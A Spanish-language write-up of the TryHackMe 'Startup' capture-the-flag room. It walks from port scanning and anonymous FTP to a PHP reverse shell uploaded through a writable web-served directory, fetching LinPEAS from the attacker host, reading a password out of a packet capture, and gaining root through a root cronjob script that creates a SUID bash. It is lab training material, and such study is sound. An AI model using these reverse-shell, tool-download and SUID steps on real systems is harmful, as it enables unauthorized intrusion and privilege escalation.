# TryHackMe: Startup - Writeup

## Paso 1: Reconocimiento Inicial (Ping)

El primer paso en cualquier CTF o prueba de penetración es asegurarse de que el objetivo es accesible y recopilar información básica. En este caso, el objetivo es la máquina con la dirección IP **10.10.200.64**.

Utilicé el comando `ping` con el parámetro `-c 4` para enviar 4 paquetes ICMP de solicitud de eco al objetivo y medir la latencia y la pérdida de paquetes.

<img width="531" height="185" alt="Ping" src="https://github.com/user-attachments/assets/cca19847-0317-4b02-9ac0-8cc5f4b1d808" />

### Comando Ejecutado
```bash
ping -c 4 10.10.200.64
````
Conclusión:

La máquina objetivo con la IP 10.10.200.64 es accesible y está en línea.

La pérdida de paquetes del 0% confirma una conexión estable.

El valor de TTL=63 sugiere que el sistema operativo del objetivo podría ser Linux (ya que los valores iniciales de TTL para Linux suelen ser 64, y el paquete ha pasado por al menos un hop o salto de red).

## Paso 2: Escaneo de Puertos (Nmap)

Una vez confirmada la accesibilidad de la máquina, el siguiente paso es realizar un escaneo de puertos para identificar los servicios que se están ejecutando. Esto nos da una superficie de ataque para futuras interacciones.

### Comando Ejecutado

<img width="799" height="624" alt="Nmap" src="https://github.com/user-attachments/assets/5804f1af-3b5e-4510-9b19-bb1a9fde1acc" />

Utilicé el siguiente comando de **Nmap** para un escaneo agresivo y la detección de versiones de servicios:
* `-T4`: Ajusta la velocidad de escaneo a un nivel más rápido.
* `-sC`: Ejecuta los scripts predeterminados de Nmap (detección básica de vulnerabilidades, enumeración, etc.).
* `-sV`: Realiza una sonda para determinar la versión del servicio.
* `-Pn`: Trata al host como en línea, omitiendo la fase de descubrimiento de hosts (útil cuando ya confirmamos el ping).

```bash
nmap -T4 -sC -sV -Pn 10.10.200.64
````
Conclusión del Escaneo

El servicio FTP anónimo en el puerto 21 es el punto de entrada más prometedor. Dado que el inicio de sesión anónimo está permitido y hay archivos listados (important.jpg, notice.txt), la siguiente acción debe centrarse en investigar este servicio.

## Paso 3: Exploración del Servicio FTP Anónimo

El escaneo de Nmap reveló que el servicio FTP en el puerto 21 permite el **inicio de sesión anónimo**. Este es un vector de ataque primario que debe explotarse de inmediato para obtener información o archivos.

### Conexión y Descarga de Archivos

Me conecté al servicio FTP utilizando las credenciales `anonymous` y una contraseña vacía (o mi correo electrónico):

<img width="755" height="890" alt="me conecto por ftp , transifero los archivos miro directorio ftp no hay nada" src="https://github.com/user-attachments/assets/ec1b0891-7693-4e3e-bb93-8a2ab6d35a6b" />

1.  **Conexión:**
    ```bash
    ftp 10.10.200.64
    # User: anonymous
    # Password: 
    ```

2.  **Archivos Iniciales:** Al listar el directorio raíz (`ls` o `dir`), se identificaron los siguientes archivos:
    * `important.jpg`
    * `notice.txt`

3.  **Descarga de Archivos:** Utilicé el comando `get` para transferir los archivos interesantes a mi máquina local.

    ```ftp
    ftp> get notice.txt
    ftp> get important.jpg
    ```

4.  **Descubrimiento Adicional:** Al revisar la primera captura, se observa que al intentar enviar un archivo con `send notice.txt ftp/notice.txt` se produce un error, lo que indica que el directorio `ftp` probablemente existe o el comando fue malformado. **Lo más importante es que, al realizar un nuevo `ls`, apareció un archivo oculto o nuevo en el listado:**
    * `test.log`

5.  **Descarga de `test.log`:**
    ```ftp
    ftp> get test.log
    ```

### Análisis del Contenido de los Archivos

Una vez que los archivos fueron descargados, se procedió a revisar su contenido en la máquina atacante.

<img width="1685" height="213" alt="leo los arhicvos nada interesante" src="https://github.com/user-attachments/assets/9fa2e833-d6d5-43ea-a8ad-08cfabaddedf" />

#### Archivo: `notice.txt`

```text
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but **Maya** is looking pretty sus.
````
Análisis:

El archivo es una queja sobre el contenido inapropiado que se sube al directorio FTP.

Pista de Usuario: Menciona el nombre de una persona: Maya. Este podría ser un nombre de usuario válido en el sistema.

Archivo: test.log
````
test
````
## Paso 4: Enumeración del Servicio Web (Puerto 80)

Con el nombre de usuario potencial `Maya` en mano, pero sin contraseña, dirigimos la atención al puerto 80, donde Apache HTTP Server está ejecutándose con el título "MAINTENANCE".

### Exploración Inicial del Sitio Web

Al visitar `http://10.10.200.64/` en el navegador, se mostró una página de mantenimiento simple.

<img width="1313" height="777" alt="pagina p80 " src="https://github.com/user-attachments/assets/e6423a07-9c14-4227-bf5a-4e1cc19c392f" />

El mensaje dice:
> **No spice here!**
> Please excuse us as we develop our site. We want to make it the most stylish and convienient way to buy peppers. Plus, we need a web developer. BTW if you're a web developer, **contact us**. Otherwise, don't worry. We'll be online shortly!
> *— Dev Team*

**Análisis:** La página no contiene enlaces ni contenido directamente útil, más allá de confirmar que el sitio está en desarrollo. Esto justifica el uso de la fuerza bruta de directorios.

### Enumeración de Directorios con Gobuster

Utilicé **Gobuster** para buscar directorios y archivos ocultos en el servidor web.

<img width="1114" height="283" alt="gobuster directorio file" src="https://github.com/user-attachments/assets/30217158-9c02-4e54-8e9c-4dc41f524366" />

#### Comando Ejecutado
* `dir`: Modo de enumeración de directorios.
* `-u`: URL del objetivo.
* `-w`: Ruta a la *wordlist* a utilizar.
* `-t 50`: Número de *threads* (hilos) para acelerar el escaneo.

```bash
gobuster dir -u [http://10.10.200.64/](http://10.10.200.64/) -w /home/quiqu3h4ck/Escritorio/wordLists/dirbuster/directory-list-2.3-medium.txt -t 50
````
Resultado de Gobuster
El escaneo reveló un directorio clave con un código de estado 301 (Movido Permanentemente):
````
Directorio,Estado,URL de Redirección
/files,301,http://10.10.200.64/files/
````
Conclusión del Paso

El directorio /files es un hallazgo significativo y es el siguiente objetivo a explorar. La redirección 301 implica que existe un directorio accesible en esa ruta.

Por lo que explorando el directorio vemos que puede ser accesible para subir archivos o sea podriamos subir un reverse shell.

<img width="656" height="237" alt="image" src="https://github.com/user-attachments/assets/bcd84260-3060-408b-90c3-bdb438f77f0a" />

## Paso 5: Obtención de Acceso Inicial (Shell de Inversa)

El escaneo con Gobuster reveló el directorio `/files` (Paso 4), y al explorarlo, se descubrió que contenía el subdirectorio `/files/ftp`. Dado que el contenido de `/files/ftp` era visible a través del navegador web, se sospechó que este directorio mapeaba directamente al directorio de inicio accesible por **FTP Anónimo** (puerto 21).

La clave para la explotación es la capacidad de subir archivos al servidor FTP que luego pueden ser ejecutados a través del servidor web.

### 5.1 Creación y Carga del Reverse Shell

1.  **Crear el Payload:** Se utilizó el conocido *reverse shell* de **PentestMonkey** en PHP (`php-reverse-shell.php`). Se modificó el archivo para configurar la dirección IP de la máquina atacante (`$ip`) y el puerto de escucha (`$port`).

    * **IP Atacante:** `10.8.24.253` (ejemplo de IP de la VPN/Tunel)
    * **Puerto de Escucha:** `443`

3.  **Subir el Archivo:** Se utilizó la conexión FTP anónima establecida en el **Paso 3** para subir el payload al directorio **`ftp`**. Este directorio era navegable y, crucialmente, tenía permisos de escritura.

    ```bash
    ftp> cd ftp
    # 250 Directory successfully changed.
    ftp> put php-reverse-shell.php
    # 226 Transfer complete.
    ```

<img width="1558" height="379" alt="creo un reverseshell el de pentestmonkey y lo transfiero al directorio ftp" src="https://github.com/user-attachments/assets/f74ef63a-04d5-496b-9fbd-7284e6ba71f6" />

### 5.2 Ejecución del Shell

1.  **Configurar el Listener:** En la máquina atacante, se configuró un *listener* (escucha) utilizando **Netcat** en el puerto 443 para esperar la conexión de la *shell* de inversa.

    ```bash
    nc -lvnp 443
    ```

2.  **Activar el Shell:** Se accedió al archivo recién subido a través del navegador web, ejecutando así el script PHP. La ruta de acceso fue:
    * `http://10.10.200.64/files/ftp/php-reverse-shell.php`

    La captura de pantalla confirma que la subida fue exitosa, ya que el archivo es visible en la ruta web:

<img width="1669" height="387" alt="ejecuto el reverse y obtengo el shell" src="https://github.com/user-attachments/assets/a3131c57-4ccb-419a-9c77-e1fd048baa34" />

### 5.3 Shell Obtenida

Al acceder al archivo, el *listener* de Netcat capturó la conexión, otorgando una *shell* de baja privilegios.

```text
listening on [any] 443 ...
connect to [10.8.24.253] from (UNKNOWN) [10.10.200.64] 60200
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
id=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
````
Credenciales Iniciales:

Usuario: www-data

Privilegios: Baja (servidor web)

## Paso 6: Estabilización de la Shell y Enumeración Inicial

La *shell* de Netcat obtenida en el paso anterior era básica e inestable (sin funciones de historial o tabulación). El primer paso dentro del sistema es convertirla en una *shell* TTY totalmente funcional.

### 6.1 Estabilización de la Shell

Se ejecutaron los siguientes comandos para estabilizar la *shell* usando Python 3 y configurar la variable `TERM`.

1.  **Spawn de una TTY (Python):** Se usó Python 3 para crear un *shell* de `bash`.
    ```bash
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    ```

2.  **Configurar la Variable TERM:** Esto permite que programas como `vi`/`nano` o `less` funcionen correctamente y habilita las funciones de terminal.
    ```bash
    export TERM=xterm
    ```

El resultado es una *shell* interactiva bajo el usuario `www-data` con un *prompt* más útil (`www-data@startup:/$`).

<img width="881" height="433" alt="estabilizamos el shell y ya tenemos el usuario" src="https://github.com/user-attachments/assets/2496ebb3-d698-448f-bdb0-646df9e0e697" />

### 6.2 Enumeración del Directorio Raíz

Una vez que la *shell* estuvo estable, se inició la enumeración del sistema desde el directorio raíz (`/`).

Se ejecutó `ls -l /` y se encontró un archivo que no es típico en el directorio raíz: `recipe.txt`.

#### Contenido de `recipe.txt`

Se leyó el archivo `recipe.txt`:

```bash
cat recipe.txt
````
El texto es:

Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it wat [contenido oculto, pero es la pista].

<img width="1133" height="208" alt="enumeramos y obtebemos la receta secreta" src="https://github.com/user-attachments/assets/d72bc815-0d35-493f-8e6e-19603cc6e9d6" />

Pista Clave: El archivo contiene el nombre del ingrediente secreto.

## Paso 7: Enumeración Exhaustiva del Sistema (LinPEAS)

Aunque la pista de la "receta secreta" es prometedora, una enumeración exhaustiva es necesaria para identificar todos los posibles vectores de escalada de privilegios. Para esto, se utilizó la herramienta automatizada **LinPEAS**.

### 7.1 Transferencia de LinPEAS

1.  **Configurar el Servidor:** En la máquina atacante, se inició un servidor web simple (por ejemplo, con Python) en el puerto 8000 para servir el script `linpeas.sh`.

    ```bash
    python3 -m http.server 8000
    ```

2.  **Descarga en el Objetivo:** Desde la *shell* de `www-data` en el objetivo, se utilizó `wget` para descargar el script. Se eligió el directorio `/var/www/html/files/ftp` ya que se sabía que era escribible.

    ```bash
    www-data@startup:/var/www/html/files/ftp$ wget 10.8.24.253:8000/linpeas.sh
    ```
    
<img width="652" height="316" alt="descargo linpeas en la maquibna" src="https://github.com/user-attachments/assets/abae8dd2-5102-4e9a-94ce-7456c9bbe313" />

3.  **Ejecución:** Se otorgaron permisos de ejecución y se ejecutó el script.

    ```bash
    chmod +x linpeas.sh
    ./linpeas.sh
    ```

### 7.2 Análisis de Resultados de LinPEAS

LinPEAS comenzó con su leyenda y luego mostró información de interés.

#### Leyenda de Colores

<img width="724" height="176" alt="referencias de linpeas para tener en cuenta" src="https://github.com/user-attachments/assets/49ebff6a-42c4-45ed-a0a7-ebdfc632ef56" />

* **ROJO/AMARILLO:** Vector de Escalada de Privilegios (PE) del 95%.
* **ROJO:** Necesita ser revisado.

#### Hallazgos Relevantes

El script de LinPEAS identificó varios archivos y directorios **inesperados en el directorio raíz** (`/`), que deben ser investigados por contenido sensible.

| Archivo/Directorio | Ubicación | Análisis Previo |
| :--- | :--- | :--- |
| **`/recipe.txt`** | `/` | **Pista clave/Contraseña** (ya investigado). |
| `/vagrant` | `/` | Directorio de máquina virtual, a menudo contiene *keys* o configuraciones. |
| `/incidents` | `/` | Directorio relacionado con posibles incidentes, debe contener logs o información. |

<img width="412" height="149" alt="carpetas interesantes" src="https://github.com/user-attachments/assets/3fed7a21-feb1-4e4a-92cb-76b1477915d8" />

**Próximo Paso:** El foco inmediato es **investigar la carpeta `/incidents`** para buscar archivos de log o *backups* que puedan contener credenciales. Alternativamente, se debe probar la credencial de **Maya** (Paso 3) con la contraseña de la "receta" (Paso 6) vía SSH.

## Paso 8: Investigación de Directorios y Descarga de PCAP

Continuando con la enumeración (Paso 7), se investigaron los directorios inusuales identificados por LinPEAS, específicamente `/incidents` y `/vagrant`.

### 8.1 Exploración de `/incidents`

Se navegó al directorio `/incidents` y se listó su contenido.

```bash
www-data@startup:/var/www/html/files/ftp$ ls -la /incidents/
````

<img width="730" height="276" alt="revisando las carpetas ecnotramos un archivo" src="https://github.com/user-attachments/assets/19f66b72-6ae0-432f-bfa5-4df39c1a4d2a" />

Resultado: Se encontró un archivo de interés con una extensión inusual y un nombre sugerente: suspicious.pcapng.

8.2 Transferencia del Archivo

Dado que el archivo es un formato de captura de paquetes de red (.pcapng), se procedió a transferirlo a la máquina atacante para su análisis posterior con herramientas como Wireshark.

Montar Servidor: Se utilizó un servidor HTTP simple en la máquina atacante (e.g., Python en el puerto 8080) para facilitar la transferencia.

Descarga del Archivo: Se usó wget en la máquina atacante para obtener el archivo desde el objetivo.
````
bash
# Comando de transferencia ejecutado desde el atacante
wget [http://10.10.200.64:8080/suspicious.pcapng](http://10.10.200.64:8080/suspicious.pcapng)
````

<img width="1847" height="474" alt="me transfiero el arhcivo a mi maquina con un srvidor de python" src="https://github.com/user-attachments/assets/8352be08-9e93-4e0f-be09-ab7ef4c320d9" />

Conclusión del Paso

Se obtuvo el archivo suspicious.pcapng, que probablemente contiene información en texto claro, como credenciales, que se pueden extraer para el siguiente paso de escalada de privilegios.

## Paso 9: Análisis del Tráfico de Red (Wireshark)

El archivo `suspicious.pcapng` (Paso 8) fue transferido a la máquina atacante para ser analizado con **Wireshark**, buscando credenciales u otra información sensible transmitida en texto claro.

### 9.1 Extracción de Credenciales

1.  **Carga del PCAP:** Se abrió el archivo `suspicious.pcapng` en Wireshark.
2.  **Seguimiento del Stream:** Se filtró el tráfico para seguir la secuencia de comandos y respuestas de un flujo TCP/HTTP sospechoso, que parecía ser una *shell* de inversa anterior.

El análisis del *stream* reveló un intento fallido de escalada de privilegios que, sin embargo, expuso una **contraseña en texto claro**.

**Tráfico Capturado Clave:**

Se observó un intento de usar el comando `sudo` para el usuario `www-data`, donde se capturó la contraseña ingresada:

```text
www-data@startup:/home$ sudo -l
[sudo] password for www-data:
****
````

9.2 Descubrimiento de Usuarios del Sistema

El mismo stream de Wireshark también mostró la lectura del archivo /etc/passwd, confirmando la existencia de los siguientes usuarios con shell de inicio de sesión:

lennie

<img width="1641" height="709" alt="revisamos el arhivo en wireshark y encotramos una clave en un protocolo de reverse shell" src="https://github.com/user-attachments/assets/9c94e8e5-cd43-4fd6-abc2-8c616535f67d" />

Conclusión del Paso

Se ha obtenido una contraseña de alta complejidad que probablemente pertenece a uno de los usuarios del sistema. El siguiente paso es probar esta contraseña contra el usuario lennie para obtener acceso al sistema con privilegios de usuario estándar, probablemente a través de SSH (Puerto 22), y así obtener la flag user.txt.

## Paso 10: Escalada a Usuario Estándar (`lennie`) y Obtención de la User Flag 🔑

Con la contraseña obtenida del archivo PCAP (Paso 9), el objetivo era escalar privilegios a un usuario del sistema para conseguir la primera flag.

### 10.1 Prueba de Credenciales Fallidas

Inicialmente, se intentó cambiar de usuario (`su`) a usuarios de interés, como `root` y `vagrant`, pero la contraseña falló en ambos casos.

```bash
www-data@startup:/$ su vagrant
Password: [Contraseña Oculta]
su: Authentication failure
````

<img width="731" height="246" alt="probamos con ususarios la clave obtenida pero no funciona" src="https://github.com/user-attachments/assets/f7535a40-01c6-44c4-a523-b0eeb853ae5d" />

10.2 Acceso Exitoso a lennie

Al revisar el directorio /home y probar la contraseña con el usuario lennie (cuyo nombre se vio en el tráfico de Wireshark), el cambio de usuario fue exitoso.

Verificación de Directorio:
````
www-data@startup:/$ ls -la home
# El listado confirma el directorio 'lennie'
````
Cambio de Usuario (su): Se utilizó la contraseña obtenida.
````
www-data@startup:/$ su lennie
Password: [] 

lennie@startup:/$ id
uid=1002(lennie) gid=1002(lennie) groups=1002(lennie)
````
10.3 Obtención de la User Flag

Una vez autenticado como lennie, se procedió a buscar el archivo user.txt en su directorio personal.
````
lennie@startup:/$ cd /home/lennie
lennie@startup:/home/lennie$ cat user.txt
[USER FLAG CAPTURADA]
````
<img width="473" height="248" alt="obtuvimo otro usuario y accedimos" src="https://github.com/user-attachments/assets/f83b1674-96a7-4cee-b2b6-63f534bdbc8e" />

## Paso 11: Obtención de la Flag de Usuario (`user.txt`) 🏆

Una vez que se escaló con éxito al usuario **`lennie`** utilizando la contraseña obtenida del archivo PCAP (Paso 10), el objetivo principal fue localizar y capturar la primera *flag*.

### 11.1 Exploración del Directorio de `lennie`

Se navegó al directorio de inicio del usuario `lennie` para buscar archivos importantes.

1.  **Navegación:**
    ```bash
    lennie@startup:/$ cd ~
    ```

2.  **Listado de Archivos:** El listado del directorio reveló tres elementos clave, incluyendo el archivo de la *flag*.
    ```bash
    lennie@startup:~$ ls
    # Documents
    # scripts
    # user.txt
    ```
    
<img width="486" height="286" alt="investifo en las carpetas de lenie y obtengo la flag user" src="https://github.com/user-attachments/assets/e4f2eb7c-e3dd-467f-aba4-448fa40adb86" />

### 11.2 Lectura y Captura de la Flag

Se procedió a leer el contenido del archivo `user.txt`.

```bash
lennie@startup:~$ cat user.txt
THM{[VALOR_DE_LA_FLAG]}
````

## Paso 12: Escalada de Privilegios a Root 👑

Con el acceso a usuario estándar (`lennie`) y la `user.txt` obtenida, el último paso es la escalada de privilegios a `root`.

### Búsqueda del Vector de Escalada

Se revisó el directorio personal de `lennie`, donde se encontró un directorio llamado `scripts`.

1.  **Exploración de `/home/lennie/scripts`:**
    ```bash
    lennie@startup:~/scripts$ ls -la
    # Se encontraron planner.sh y startup_list.txt
    ```

2.  **Análisis de `planner.sh`:**
    Se identificó que el script `planner.sh` ejecuta otro script en el directorio `/etc`.

    ```bash
    lennie@startup:~/scripts$ cat planner.sh
    ...
    /etc/print.sh
    ```

3.  **Análisis de Permisos de `/etc/print.sh`:**
    Se investigó el script de destino, `/etc/print.sh`.

    ```bash
    lennie@startup:~/scripts$ ls -lah /etc/print.sh
    -rwx------ 1 lennie lennie 25 Nov 12 2020 /etc/print.sh
    ```
    **¡Vector Encontrado!** El script `/etc/print.sh` es propiedad de **`lennie`** y tiene permisos de escritura y ejecución solo para él. Este script es ejecutado por **`planner.sh`**, el cual, al estar en la ruta de un usuario, es muy probable que se ejecute periódicamente como `root` a través de un *cronjob* (trabajo programado).

    El contenido inicial era simple:
    ```bash
    lennie@startup:~/scripts$ cat /etc/print.sh
    #!/bin/bash
    echo "Done!"
    ```
    
<img width="585" height="539" alt="dentro de los scirpts descubirmos que el usuairotiene permisos para escirbir en el print" src="https://github.com/user-attachments/assets/74d2ca1e-f749-49f2-b955-04f193b94e96" />

## Paso 13: Monitoreo, Explotación del Cronjob y Obtención de la Root Flag 👑

Con el conocimiento de que el script `/etc/print.sh` es escribible por `lennie`, el objetivo es confirmar que es ejecutado por `root` y explotarlo.

### 13.1 Monitoreo de Procesos con `pspy64`

Se utilizó `pspy64` para confirmar la ejecución periódica del script `planner.sh` con privilegios de `root`.

1.  **Transferencia de `pspy64`:** Se transfirió el binario a un directorio escribible (`/dev/shm`) y se le otorgaron permisos de ejecución.

    ```bash
    # En objetivo
    lennie@startup:/dev/shm$ chmod +x pspy64
    ```
    
<img width="543" height="289" alt="me transfiero desde mi maquina usando scp pspy64" src="https://github.com/user-attachments/assets/39f84d9b-57ef-4e9d-b583-adaf72fd4193" />

2.  **Ejecución y Confirmación:** Al ejecutar `pspy64`, se confirmó que el proceso que llama a `/home/lennie/scripts/planner.sh` y, por ende, a `/etc/print.sh`, tiene **UID=0 (root)**.

<img width="1012" height="294" alt="vemos como se ejcuta la tarea " src="https://github.com/user-attachments/assets/3866df71-f033-4bd8-97ce-1aea3e86eb1d" />

### 13.2 Explotación (Creación de SUID Binary)

Se modificó el script escribible `/etc/print.sh` para crear un binario con *SUID* que nos permitiera ejecutar comandos con privilegios de `root` una vez que el *cronjob* se ejecutara.

1.  **Modificación del Script:** Se añadieron comandos para **copiar `/bin/bash` a `/tmp/bash`** y asignarle los **permisos SUID (4755)**.

    ```bash
    # Contenido añadido a /etc/print.sh:
    cp /bin/bash /tmp/bash
    chmod 4755 /tmp/bash
    ```
    
<img width="338" height="206" alt="modifico el print sh" src="https://github.com/user-attachments/assets/fdb93a34-4b48-48d2-b75b-adf081edb755" />

2.  **Ejecución de la Root Shell:** Después de esperar la ejecución del *cronjob* de `root`, el nuevo *binary* `/tmp/bash` se ejecuta con privilegios de `root` usando la opción `-p`.

    ```bash
    lennie@startup:~$ /tmp/bash -p
    # Obtención de la shell de root
    ```

### 13.3 Obtención de la Root Flag 🏁

Con la *shell* de `root`, se navegó al directorio `/root` para obtener la *flag* final.

```bash
bash-4.3# cat /root/root.txt
THM{[ROOT FLAG CAPTURADA]}
````

<img width="518" height="135" alt="esperamos que s eejcute el script y obtenemos root y la flag root" src="https://github.com/user-attachments/assets/7ef82608-2318-4b1d-a1f2-796231d83b23" />
